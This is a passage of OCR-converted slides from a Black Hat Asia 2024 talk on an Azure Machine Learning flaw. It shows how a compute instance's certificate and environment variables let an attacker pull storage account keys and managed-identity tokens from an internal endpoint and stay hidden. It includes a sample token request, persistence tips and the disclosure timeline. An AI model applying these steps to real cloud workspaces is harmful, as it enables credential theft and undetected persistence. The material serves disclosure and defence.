mecapt toting « -
{"RequestType":"getworkspace" } (EEE
#BHASIA @BlackHatEvents
```

## Slide 61

##### Fetching AML Workspace Informa(on

fn: hosjools/clients. **GetWorkspaceInfo**

dsimountagent

AML Workspace Metadata

$AZ_BATCHAI_XDS_ENDPOINT

#BHASIA  @BlackHatEvents

## Slide 62

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
nt =
mers: - Se x > —a
"name": “amldemo",
"id": "/subscriptions/ ire:
"location": "eastasia",
“tags": {},
"properties": {
"friendlyName": “amldemo",
;OeSCription ceo.
“storageAccount": "/subscriptions
"keyVault": "/subscriptions/
applicationInsights": "/subscriptions
WHET WOFREPECE false
iworkspace : 2
“tenantId":
“imageBuildCompute": null,
"“provisioningState": "Succeeded",
"“containerRegistry": "/subscriptions/
“creationTime": re
"“subscriptionResourceGroupMoveState": null,
"“subscriptionState": null,
“subscriptionStatusChangeTimeStampUtc": null,
#BHASIA @BlackHatEvents
```

## Slide 63

##### Fetching Storage Account Key

fn: hosttools/clients. **GetWorkspaceSecrets**

dsimountagent

$AZ_BATCHAI_XDS_ENDPOINT

Storage Account JWE

#BHASIA  @BlackHatEvents

## Slide 64

$AZ_LS_ENCRYPTED_SYMMETRIC_KEY Decrypted Symmetric Key $AZ_BATCHAI_CLUSTER_PRIVATE_KEY_PEM

_dsimountagentenv/dsiidlestopagentenv_

Decrypted Symmetric Key JWE of Storage Account Access Key

Storage Account Access Key

#BHASIA  @BlackHatEvents

## Slide 65

##### Attack Scenario

Certificate + Private Key
Storage Account Access Key
Environment Variables

#BHASIA  @BlackHatEvents

## Slide 66

Does rotating the key help?

#BHASIA  @BlackHatEvents

## Slide 67

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
oo CG 08 & azure.com, 103%
Hor
3B amidemo x
Azure c Learn
Search
Download config.json
@ Overview
/ Essentials
Activity log
Resource group
2 Access control (IAM) ves
¢ Tags
Location
e Diagnose and solve problems EasvAst
— Subscription
vents
esear ena
Settings Subscription ID
22c8fb2-0e66-4db5-86
Networking 022c8fb2-0e66-4db5-8628
Storage
HH Properties a
Bash v
Oo? €@hRA 0B
Requesting a Cloud Shell.Succeeded.
Connecting terminal...
nitesh [ ~ ]$ []
Delete
Studio web URL
ttps Lazu
Container Registry
testcontainereg
Key Vault
amldemo6956742¢
Application Insights
MLflow tracking UR
azureml://eastasia.api.azur...
J .|-persistence
x
aL
```

## Slide 68

_Does the story end here?_

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
biStkhat ae ; = _ =e ae ~
ASIA 2024
Does the story end here?
```

## Slide 69

##### Cloud Agents

👑

👑

👑

👑

#BHASIA  @BlackHatEvents

## Slide 70

##### Fetching more {“RequestType”:”?”}

hosWools/clients. **GetWorkspaceSecrets**

hosttools/clients. **generateXDSApiRequestSchema**

#BHASIA  @BlackHatEvents

## Slide 71

##### Fetching System Assigned MI JWT

fn: hosWools/clients. **GetAADToken**

$AZ_BATCHAI_XDS_ENDPOINT

Entra ID JWT of Managed Identity

identityresponderd

#BHASIA  @BlackHatEvents

## Slide 72

Entra ID JWT of System Assigned Managed IdenBty

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
biSekhat N ss a
ASIA 2024 Se
"“errorCode": "Success",
“response”™:”
{\"Token\": \"eyJ@eXAi0i IJKV1QiLCJhbGcid0iJSUzZI1INiIsIngidCI6IiiLsT?
UjdiUm9meG11lWm9YcWJIWkdldyJ9.
Entra ID JWT of System Assigned Managed Identity
#BHASIA @BlackHatEvents
```

## Slide 73

##### Fetching User Assigned MI JWT

fn: hosttools/clients. **GetAADToken**

idenMtyresponderd

$AZ_BATCHAI_XDS_ENDPOINT Entra ID JWT of Managed Identity

#BHASIA  @BlackHatEvents

## Slide 74

##### Recap

$AZ_BATCHAI_XDS_ENDPOINT ‘whoami’ of AML Workspace Storage Account Access Key Managed IdenBty JWTs …

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2024
Recap
afi
-W
la
~
$AZ_BATCHAI_XDS_ENDPOINT
‘whoami’ of AML Workspace
Storage Account Access Key
Managed Identity JWTs
#BHASIA @BlackHatEvents
```

## Slide 75

But we can use the logs, right?

#BHASIA  @BlackHatEvents

## Slide 76

##### Legitimate Activity

$ az login --iden(ty

Fetching Managed Identity JWT from a Compute Instance

#BHASIA  @BlackHatEvents

## Slide 77

##### Malicious Ac(vity

$AZ_BATCHAI_XDS_ENDPOINT

Entra ID JWT of Managed Identity

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ASIA 2024
piSdkhat a > ae : _-
Malicious Activity
if
“RequestType": "getaadtoken",
“RequestBody":"{\"resource\":\"https://management.azure.com/\"}"
SS
$AZ_BATCHAI_XDS_ENDPOINT
ww
Entra ID JWT of Managed Identity
#BHASIA @BlackHatEvents
```

## Slide 78

##### Generated Logs

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
A
= / a \ \ a
blackhat NN > ,
ASIA 2024
Generated Logs
+ Downloads diff Attacker.json Compute-Instance. json
2,3c2,3
< "id": "17a0e470-7eH0-4b76—-aa3e—-42F8F5bcH600" ,
< "createdDateTime": "2023-07-15T11:07:07Z",
> "id": "e089d82d-16f6—-4F95-8878-Ffilua8a3ad300",
> "createdDateTime": "2023-07-15T10:54:48Z",
13c13
< "correlationId": "Od34d004-6b11-4523-801f-2194Fb9bU6b2" ,
> "correlationId": "36c3b381-7baf-—436d-8909- Activity Details: Sign-ins
48cH8
< "uniqueTokenIdentifier": "cOSgFOB-dkugPkL4
a Basic info Location Authentication Events
> "uniqueTokenIdentifier": "LdiJ4PYWLU-IePFK
+» Downloads IP address
Autonomous system number
#BHASIA
@BlackHatEvents
```

## Slide 79

How to detect stolen certs?

#BHASIA  @BlackHatEvents

## Slide 80

#BHASIA  @BlackHatEvents

## Slide 81

Why is this even a vulnerability?

#BHASIA  @BlackHatEvents

## Slide 82

h"ps://learn.microso1.com/en-us/azure/ac5ve-directory/managed-iden55es-azure-resources/overview

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Qa =~ ie iy ae
blackhat , - = ‘
ASIA 2024 ~~ \
System assigned Some Azure resources, such as virtual mactwnes allow you
to enable a managed identity directly on the resource. When you enable a
system assigned managed identity
© A service principal of a special type is created in Azure AD for the identity.
The service principal is ted to the lifecycle of that Azure resource. When
the Azure resource deleted. Azure automatically deletes the service
principal for you
_ You authonze the managed identity to have access to one or more
services.
~The name of the system-assigned service principal s always the same as
the name of the Azure resource it 1s created for For a deployment siot. the
name of its system assigned identity ‘5 <app-nene>/slote/<slet-neme>
https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview
#BHASIA @BlackHatEvents
```

## Slide 83

This is trust.. But did you verify ?

#BHASIA  @BlackHatEvents

## Slide 84

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ASIA 2024
AZURE
SUPPORT?
#BHASIA @BlackHatEvents
```

## Slide 85

##### 🔥 Call Azure Support!

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2024
Call Azure Support! é
Azure Managed Identity can obtain a token from Managed Identity endpoint from inside
the Azure Virtual Network. The token acquisition endpoint for the managed identities
‘http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-
01&resource=https%3A%2F %2Fvault.azure.net&client_id=<UAMI CLIENT ID>' is not
accessible from outside of the resource, hence the token acquisition call needs to come
from the resource to which the managed identity is assigned.
Due to which the
sign-in logs don't show any IP Address
but you can reference it to the
private IP of the resource making the token acquisition call.
#BHASIA @BlackHatEvents
```

## Slide 86

##### 🔥 Call Azure Support!

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat =
ASIA 2024
Call Azure Support! é
Is it implied that public IP address of the resource from where a MI token has been
fetched will not be visible in any of the log sources across Azure such as Microsoft
Graph logs?
[A] No,|Microsoft Entra doesn't record the IP address of the source|while populating
the sign-in. It is assumed that the sign-in happened from the targeted managed
identity resource.
#BHASIA @BlackHatEvents
```

## Slide 87

##### Persistence

- Fetch rotated keys, MI JWTs, etc.

- CerBficate valid for two years

🔥

- Logging discrepancies ==

#BHASIA  @BlackHatEvents

## Slide 88

##### Disclosure Timeline

04/07/23 – ZDI reported the vulnerability to the vendor. 04/11/23 – The vendor acknowledged the report. 07/13/23 – ZDI asked for an update.

07/19/23 – The vendor asked us to join a call to discuss the report.

07/19/23 – ZDI joined the call and provided the vendor with addiPonal details.

07/20/23 – The vendor states that they are considering this bug low severity and that they would release a fix in 30-45 days.

07/20/23 – The ZDI informed the vendor that the case is due on 08/05/23 and that we are publishing this case as a zero-day advisory on 08/09/23.

<u>https://www.zerodayinitiative.com/advisories/ZDI-23-1056/</u>

#BHASIA  @BlackHatEvents

## Slide 89

##### References

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pis hat
ASIA 2024
References
You Can't See Me
Achieving Stealthy Persistence in Azure Machine
Learning
Inthe latest installment of our Ongoing series where we identify.and investigate
security flaws in Azure Machine Learning (AML), we explore how. cybercriminals
could manage to covertly gain persistence in AML workspaces:
#BHASIA @BlackHatEvents
```

## Slide 90

How many services support M.I.?

#BHASIA  @BlackHatEvents

## Slide 91

## 50+ Azure Services

https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/managed-identities-status#services-supporting-managed-identities

#BHASIA  @BlackHatEvents

## Slide 92

##### Future Scope: Azure Services x M.I.

🎯

|API Management|Azure Container Instance|Azure Event Hubs|
|---|---|---|
|Application Gateway|Azure Container Registry|Azure Image Builder|
|**Azure App Services**|**Azure Machine Learning**|Azure IoT Hub|
|Azure Arc|Azure Data Box|Azure Kubernetes Service|
|Azure Automanage|Azure Data Explorer|Azure Logic Apps|
|Azure Automation|Azure Data Factory|Azure Log Analytics|
|Azure Batch|Azure Data Lake|Azure Media services|
|Azure Blueprints|Azure Data Share|Azure Service Fabric|
|Azure Cache|Azure DevTest Labs|Azure Stack Edge|
|Azure Container Apps|Azure Event Grid|Azure Virtual Machines|

#BHASIA  @BlackHatEvents

## Slide 93

##### Takeaways

- Use environment variables carefully

- Threat model CSP services

- Least privilege for identities

- Examine Cloud APIs & find 🔥 bugs

#BHASIA  @BlackHatEvents

## Slide 94

##### Takeaways

- Test & Secure AuthN & AuthZ scopes

- AcBonable logging for detecBon

- Assume Breach scenarios & edge cases

- Challenge official documentaBon

#BHASIA  @BlackHatEvents

## Slide 95

##### Acknowledgements

X: @thezdi

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pifekhat Ae —— = Z
ASIA 2024
Acknowledgements
ZERO DAY
INITIATIVE
X: @thezdi
a
#BHASIA @BlackHatEvents
```

## Slide 96

##### Q/A

Source: https://surveysparrow.com/blog/funny-customer-service-memes/

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
biSekhat N ie ee a ues
ASIA 2024
Q/A
| HAVE A VERY PARTICULAR SET OF SKILLS.
#BHASIA @BlackHatEvents
| WILL FIND YOUR QUESTIONS,
AND I whdbace ANSWER THEM
Source : https://surveysparrow.com/blog/funny-customer-service-memes/
```

## Slide 97

👇

##### Find us

niteshsurana.com

x.com/anu4is

#BHASIA  @BlackHatEvents

## Slide 98

⚡

##### ⚡ Black Hat Sound Bytes

Assume breach x edge cases == variants of bugs Challenge official documentation

Examine Cloud APIs & find 🔥 bugs

#BHASIA  @BlackHatEvents
